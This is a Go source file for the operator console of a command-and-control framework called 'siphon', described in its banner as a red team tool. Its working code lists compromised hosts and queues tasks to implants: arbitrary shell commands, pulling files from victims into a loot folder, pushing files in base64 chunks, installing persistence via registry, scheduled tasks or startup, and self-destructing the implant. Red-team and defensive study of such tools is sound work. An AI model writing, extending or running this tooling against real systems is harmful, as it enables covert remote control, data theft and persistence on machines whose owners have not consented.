package server

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"time"

	"siphon/shared"
)

// chunkData splits data into pieces of at most chunkSize bytes.
func chunkData(data []byte, chunkSize int) [][]byte {
	if chunkSize <= 0 {
		return [][]byte{data}
	}
	if len(data) == 0 {
		return [][]byte{data} // intentional: creates empty file on remote side
	}
	var chunks [][]byte
	for len(data) > 0 {
		end := chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[:end])
		data = data[end:]
	}
	return chunks
}

// Catppuccin Mocha true-color ANSI escape helpers.
// Format: \033[38;2;R;G;Bm
const (
	colorReset   = "\033[0m"
	colorText    = "\033[38;2;205;214;244m" // #cdd6f4 Text
	colorGreen   = "\033[38;2;166;227;161m" // #a6e3a1 Green
	colorRed     = "\033[38;2;243;139;168m" // #f38ba8 Red
	colorYellow  = "\033[38;2;249;226;175m" // #f9e2af Yellow
	colorMauve   = "\033[38;2;203;166;247m" // #cba6f7 Mauve
	colorBlue    = "\033[38;2;137;180;250m" // #89b4fa Blue
	colorPeach   = "\033[38;2;250;179;135m" // #fab387 Peach
	colorTeal    = "\033[38;2;148;226;213m" // #94e2d5 Teal
	colorSurface = "\033[38;2;49;50;68m"    // #313244 Surface 0
	colorOverlay = "\033[38;2;108;112;134m" // #6c7086 Overlay 0
)

// bannerLines is the ASCII art split by line for gradient rendering.
var bannerLines = []string{
	`    _____ _       __                `,
	`   / ___/(_)___  / /_  ____  ____  `,
	`   \__ \/ / __ \/ __ \/ __ \/ __ \ `,
	`  ___/ / / /_/ / / / / /_/ / / / / `,
	` /____/_/ .___/_/ /_/\____/_/ /_/  `,
	`       /_/                         `,
}

// bannerGradient applies a Mauve→Blue→Teal gradient across the banner lines.
var bannerGradient = []string{
	"\033[38;2;203;166;247m", // Mauve
	"\033[38;2;180;173;248m", // Mauve→Blue blend
	"\033[38;2;137;180;250m", // Blue
	"\033[38;2;120;203;231m", // Blue→Teal blend
	"\033[38;2;148;226;213m", // Teal
	"\033[38;2;148;226;213m", // Teal (continued)
}

func printBanner() {
	fmt.Println()
	for i, line := range bannerLines {
		color := bannerGradient[i%len(bannerGradient)]
		fmt.Printf("%s%s%s\n", color, line, colorReset)
	}
	fmt.Printf("%s  C2 Framework — red team operator console%s\n", colorOverlay, colorReset)
	fmt.Println()
}

func prompt(selectedID string) string {
	if selectedID == "" {
		return fmt.Sprintf("%ssiphon%s > ", colorMauve, colorText)
	}
	short := shortID(selectedID)
	return fmt.Sprintf("%ssiphon%s(%s%s%s) > ", colorMauve, colorText, colorBlue, short, colorText)
}

// tableRow renders a single implant row, coloring Last Seen green if recent
// (within 2× default sleep) or yellow if stale.
func fmtLastSeen(t time.Time) (string, string) {
	ago := time.Since(t)
	var label string
	switch {
	case ago < time.Second:
		label = "just now"
	case ago < time.Minute:
		label = fmt.Sprintf("%ds ago", int(ago.Seconds()))
	case ago < time.Hour:
		label = fmt.Sprintf("%dm ago", int(ago.Minutes()))
	default:
		label = fmt.Sprintf("%dh ago", int(ago.Hours()))
	}

	// Threshold: 60s default sleep × 2 = 120s stale boundary.
	var color string
	if ago < 120*time.Second {
		color = colorGreen
	} else {
		color = colorYellow
	}
	return label, color
}

func printImplantsTable(implants []Implant) {
	if len(implants) == 0 {
		fmt.Printf("%s  no implants connected%s\n", colorOverlay, colorReset)
		return
	}

	border := colorSurface
	hdr := colorTeal
	rst := colorReset

	fmt.Printf("%s┌──────────────────────────────────────┬────────────────────┬────────────────┬──────────┬──────────┬──────────────┐%s\n", border, rst)
	fmt.Printf("%s│%s %s%-36s%s %s│%s %s%-18s%s %s│%s %s%-14s%s %s│%s %s%-8s%s %s│%s %s%-8s%s %s│%s %s%-12s%s %s│%s\n",
		border, rst,
		hdr, "ID", rst, border, rst,
		hdr, "Hostname", rst, border, rst,
		hdr, "User", rst, border, rst,
		hdr, "OS", rst, border, rst,
		hdr, "Arch", rst, border, rst,
		hdr, "Last Seen", rst, border, rst,
	)
	fmt.Printf("%s├──────────────────────────────────────┼────────────────────┼────────────────┼──────────┼──────────┼──────────────┤%s\n", border, rst)

	for _, imp := range implants {
		lsLabel, lsColor := fmtLastSeen(imp.LastSeen)

		hostname := imp.Hostname
		if len(hostname) > 18 {
			hostname = hostname[:15] + "..."
		}
		username := imp.Username
		if len(username) > 14 {
			username = username[:11] + "..."
		}
		osStr := imp.OS
		if len(osStr) > 8 {
			osStr = osStr[:8]
		}
		arch := imp.Arch
		if len(arch) > 8 {
			arch = arch[:8]
		}

		fmt.Printf("%s│%s %s%-36s%s %s│%s %s%-18s%s %s│%s %s%-14s%s %s│%s %s%-8s%s %s│%s %s%-8s%s %s│%s %s%-12s%s %s│%s\n",
			border, rst,
			colorBlue, imp.ID, rst, border, rst,
			colorText, hostname, rst, border, rst,
			colorText, username, rst, border, rst,
			colorText, osStr, rst, border, rst,
			colorText, arch, rst, border, rst,
			lsColor, lsLabel, rst, border, rst,
		)
	}

	fmt.Printf("%s└──────────────────────────────────────┴────────────────────┴────────────────┴──────────┴──────────┴──────────────┘%s\n", border, rst)
}

func printHelp() {
	cmds := [][]string{
		{"implants", "list connected implants"},
		{"interact <id>", "select an implant to interact with"},
		{"cmd <command>", "queue a shell command on the selected implant"},
		{"upload <remote_path>", "queue file upload (implant → server)"},
		{"download <local_file> <remote_path>", "queue file download (server → implant)"},
		{"sleep <seconds>", "change beacon sleep interval"},
		{"persist <method> <name>", "install persistence (registry, schtask, startup)"},
		{"unpersist <method> <name>", "remove persistence"},
		{"selfdestruct", "delete implant binary from disk and exit"},
		{"exit-implant", "tell the selected implant to exit"},
		{"back", "deselect current implant"},
		{"tasks", "show pending tasks for selected implant"},
		{"results", "show results from selected implant"},
		{"help", "show this help"},
		{"exit", "exit the server"},
	}

	fmt.Printf("\n%sAvailable commands:%s\n\n", colorTeal, colorReset)
	for _, row := range cmds {
		fmt.Printf("  %s%-40s%s %s%s%s\n", colorPeach, row[0], colorReset, colorOverlay, row[1], colorReset)
	}
	fmt.Println()
}

// RunCLI starts the interactive operator CLI. It blocks until the user types "exit".
// Call this in a goroutine alongside Start().
func (s *C2Server) RunCLI() {
	printBanner()
	printHelp()

	scanner := bufio.NewScanner(os.Stdin)
	var selectedID string

	for {
		fmt.Printf("%s", prompt(selectedID))

		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]

		switch cmd {
		case "exit":
			fmt.Printf("%s[*] shutting down%s\n", colorMauve, colorReset)
			return

		case "help":
			printHelp()

		case "implants":
			imps := s.GetImplants()
			printImplantsTable(imps)

		case "interact":
			if len(parts) < 2 {
				fmt.Printf("%s[-] usage: interact <id>%s\n", colorRed, colorReset)
				continue
			}
			id := parts[1]
			imp := s.GetImplant(id)
			// Also try prefix match.
			if imp == nil {
				var matches []Implant
				for _, candidate := range s.GetImplants() {
					if strings.HasPrefix(candidate.ID, id) {
						matches = append(matches, candidate)
					}
				}
				if len(matches) == 1 {
					imp = &matches[0]
				} else if len(matches) > 1 {
					fmt.Printf("%s[-] ambiguous prefix '%s' matches %d implants%s\n",
						colorRed, id, len(matches), colorReset)
					continue
				}
			}
			if imp == nil {
				fmt.Printf("%s[-] no implant with ID %s%s\n", colorRed, id, colorReset)
				continue
			}
			selectedID = imp.ID
			fmt.Printf("%s[+] interacting with %s (%s@%s)%s\n",
				colorGreen, shortID(imp.ID), imp.Username, imp.Hostname, colorReset)

		case "back":
			selectedID = ""
			fmt.Printf("%s[*] deselected implant%s\n", colorOverlay, colorReset)

		case "cmd":
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected — use: interact <id>%s\n", colorRed, colorReset)
				continue
			}
			if len(parts) < 2 {
				fmt.Printf("%s[-] usage: cmd <command>%s\n", colorRed, colorReset)
				continue
			}
			cmdStr := strings.Join(parts[1:], " ")
			task := &shared.Task{
				ID:   shared.GenerateID(),
				Type: "cmd",
				Args: cmdStr,
			}
			if s.QueueTask(selectedID, task) {
				fmt.Printf("%s[+] task queued: %s %s%s\n", colorGreen, shortID(task.ID), cmdStr, colorReset)
			} else {
				fmt.Printf("%s[-] failed to queue task%s\n", colorRed, colorReset)
			}

		case "upload":
			// upload <remote_path> — tell the implant to read a file and send it back.
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected%s\n", colorRed, colorReset)
				continue
			}
			if len(parts) < 2 {
				fmt.Printf("%s[-] usage: upload <remote_path>%s\n", colorRed, colorReset)
				continue
			}
			remotePath := parts[1]
			task := &shared.Task{
				ID:   shared.GenerateID(),
				Type: "upload",
				Args: remotePath,
			}
			if s.QueueTask(selectedID, task) {
				fmt.Printf("%s[+] upload task queued: %s \u2192 server (loot/%s/)%s\n",
					colorGreen, remotePath, shortID(selectedID), colorReset)
			} else {
				fmt.Printf("%s[-] failed to queue task%s\n", colorRed, colorReset)
			}

		case "download":
			// download <local_file> <remote_path> — send a local file to the implant.
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected%s\n", colorRed, colorReset)
				continue
			}
			if len(parts) < 3 {
				fmt.Printf("%s[-] usage: download <local_file> <remote_path>%s\n", colorRed, colorReset)
				continue
			}
			localFile := parts[1]
			remotePath := parts[2]

			data, err := os.ReadFile(localFile)
			if err != nil {
				fmt.Printf("%s[-] cannot read local file: %v%s\n", colorRed, err, colorReset)
				continue
			}

			// Chunk the file if it exceeds ChunkSize. Each chunk is a
			// separate download task with the same remote path. The implant
			// appends each chunk to the target file.
			chunks := chunkData(data, shared.ChunkSize)
			for i, chunk := range chunks {
				b64chunk := base64.StdEncoding.EncodeToString(chunk)
				mode := "create"
				if i > 0 {
					mode = "append"
				}
				task := &shared.Task{
					ID:   shared.GenerateID(),
					Type: "download",
					Args: b64chunk + "|" + remotePath + "|" + mode,
				}
				s.QueueTask(selectedID, task)
			}
			fmt.Printf("%s[+] download queued: %s → %s (%d bytes, %d chunk(s))%s\n",
				colorGreen, localFile, remotePath, len(data), len(chunks), colorReset)

		case "sleep":
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected%s\n", colorRed, colorReset)
				continue
			}
			if len(parts) < 2 {
				fmt.Printf("%s[-] usage: sleep <seconds>%s\n", colorRed, colorReset)
				continue
			}
			task := &shared.Task{
				ID:   shared.GenerateID(),
				Type: "sleep",
				Args: parts[1],
			}
			if s.QueueTask(selectedID, task) {
				fmt.Printf("%s[+] sleep task queued: %ss interval%s\n", colorGreen, parts[1], colorReset)
			} else {
				fmt.Printf("%s[-] failed to queue task%s\n", colorRed, colorReset)
			}

		case "persist":
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected%s\n", colorRed, colorReset)
				continue
			}
			if len(parts) < 3 {
				fmt.Printf("%s[-] usage: persist <registry|schtask|startup> <name>%s\n", colorRed, colorReset)
				continue
			}
			args := parts[1] + "|" + parts[2]
			task := &shared.Task{ID: shared.GenerateID(), Type: "persist", Args: args}
			if s.QueueTask(selectedID, task) {
				fmt.Printf("%s[+] persist task queued: method=%s%s\n", colorGreen, parts[1], colorReset)
			} else {
				fmt.Printf("%s[-] failed to queue task%s\n", colorRed, colorReset)
			}

		case "unpersist":
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected%s\n", colorRed, colorReset)
				continue
			}
			if len(parts) < 3 {
				fmt.Printf("%s[-] usage: unpersist <registry|schtask|startup> <name>%s\n", colorRed, colorReset)
				continue
			}
			args := parts[1] + "|" + parts[2]
			task := &shared.Task{ID: shared.GenerateID(), Type: "unpersist", Args: args}
			if s.QueueTask(selectedID, task) {
				fmt.Printf("%s[+] unpersist task queued: method=%s%s\n", colorYellow, parts[1], colorReset)
			} else {
				fmt.Printf("%s[-] failed to queue task%s\n", colorRed, colorReset)
			}

		case "selfdestruct":
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected%s\n", colorRed, colorReset)
				continue
			}
			fmt.Printf("%s[!] This will DELETE the implant binary from disk and kill the process.%s\n", colorRed, colorReset)
			fmt.Printf("%s    Type 'confirm' to proceed: %s", colorYellow, colorReset)
			if !scanner.Scan() {
				continue
			}
			if strings.TrimSpace(scanner.Text()) != "confirm" {
				fmt.Printf("%s[*] cancelled%s\n", colorOverlay, colorReset)
				continue
			}
			task := &shared.Task{ID: shared.GenerateID(), Type: "selfdestruct", Args: ""}
			if s.QueueTask(selectedID, task) {
				fmt.Printf("%s[+] self-destruct queued for %s%s\n", colorRed, shortID(selectedID), colorReset)
				selectedID = ""
			} else {
				fmt.Printf("%s[-] failed to queue task%s\n", colorRed, colorReset)
			}

		case "exit-implant":
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected%s\n", colorRed, colorReset)
				continue
			}
			task := &shared.Task{
				ID:   shared.GenerateID(),
				Type: "exit",
				Args: "",
			}
			if s.QueueTask(selectedID, task) {
				fmt.Printf("%s[+] exit task queued for %s%s\n", colorYellow, shortID(selectedID), colorReset)
				selectedID = ""
			} else {
				fmt.Printf("%s[-] failed to queue task%s\n", colorRed, colorReset)
			}

		case "tasks":
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected%s\n", colorRed, colorReset)
				continue
			}
			imp := s.GetImplant(selectedID)
			if imp == nil {
				fmt.Printf("%s[-] implant not found%s\n", colorRed, colorReset)
				continue
			}

			if len(imp.TaskQueue) == 0 {
				fmt.Printf("%s  no pending tasks%s\n", colorOverlay, colorReset)
				continue
			}
			fmt.Printf("\n%sPending tasks for %s:%s\n\n", colorTeal, shortID(selectedID), colorReset)
			for _, t := range imp.TaskQueue {
				fmt.Printf("  %s%s%s  type=%s%s%s  args=%s%s%s\n",
					colorBlue, shortID(t.ID), colorReset,
					colorPeach, t.Type, colorReset,
					colorText, t.Args, colorReset,
				)
			}
			fmt.Println()

		case "results":
			if selectedID == "" {
				fmt.Printf("%s[-] no implant selected%s\n", colorRed, colorReset)
				continue
			}
			imp := s.GetImplant(selectedID)
			if imp == nil {
				fmt.Printf("%s[-] implant not found%s\n", colorRed, colorReset)
				continue
			}

			if len(imp.Results) == 0 {
				fmt.Printf("%s  no results yet%s\n", colorOverlay, colorReset)
				continue
			}
			fmt.Printf("\n%sResults for %s:%s\n\n", colorTeal, shortID(selectedID), colorReset)
			for _, res := range imp.Results {
				statusColor := colorGreen
				statusLabel := "ok"
				if !res.Success {
					statusColor = colorRed
					statusLabel = "err"
				}
				fmt.Printf("%s┄┄┄ %s[%s]%s task=%s%s%s %s┄┄┄%s\n",
					colorSurface,
					statusColor,
					statusLabel,
					colorReset,
					colorBlue, shortID(res.TaskID), colorReset,
					colorSurface, colorReset,
				)
				fmt.Printf("%s%s%s\n\n", colorText, res.Output, colorReset)
			}

		default:
			fmt.Printf("%s[-] unknown command: %s — type 'help' for usage%s\n", colorRed, cmd, colorReset)
		}
	}
}
